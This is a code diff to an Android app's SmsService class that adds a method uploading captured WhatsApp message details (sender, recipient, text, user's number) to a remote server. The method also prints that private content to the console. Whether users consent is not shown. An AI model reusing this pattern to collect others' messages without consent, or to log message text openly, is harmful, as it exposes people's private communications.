@@ -1,5 +1,6 @@
 package gonext.smsapp.servers;
 
+import android.app.Notification;
 import android.content.Context;
 
 import com.google.gson.Gson;
@@ -9,10 +10,12 @@ import com.squareup.okhttp.Cache;
 import com.squareup.okhttp.OkHttpClient;
 
 import java.io.File;
+import java.util.List;
 import java.util.concurrent.Executor;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
+import gonext.smsapp.db.NotificationEntity;
 import gonext.smsapp.utils.Constant;
 import retrofit.RestAdapter;
 import retrofit.client.OkClient;
@@ -63,7 +66,21 @@ public class SmsService {
         smsAPI.postMessages("SMSList",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
     }
 
-    private String removeSpChars(String s){
+    public void sendNotification(String userMob, String msgId, String msgDate, String msgFrom, String to, String msgText, List<NotificationEntity> notifications){
+        initSMSAPI();
+        SmsCallback smsCallback = new SmsCallback(context,3,notifications);
+        System.out.println("*****************************");
+        System.out.println("userMob ="+userMob);
+        System.out.println("msgId ="+msgId);
+        System.out.println("msgDate ="+msgDate);
+        System.out.println("msgFrom ="+removeSpChars(msgFrom));
+        System.out.println("to ="+removeSpChars(to));
+        System.out.println("msgText ="+msgText);
+        System.out.println("*****************************");
+        smsAPI.postWhatsApp("WHATSAPP",userMob,msgId,msgDate,removeSpChars(msgFrom),removeSpChars(to),msgText,smsCallback);
+    }
+
+    public static String removeSpChars(String s){
         s = s.replace("+","");
         s = s.replace("-","");
         s = s.replace("(","");
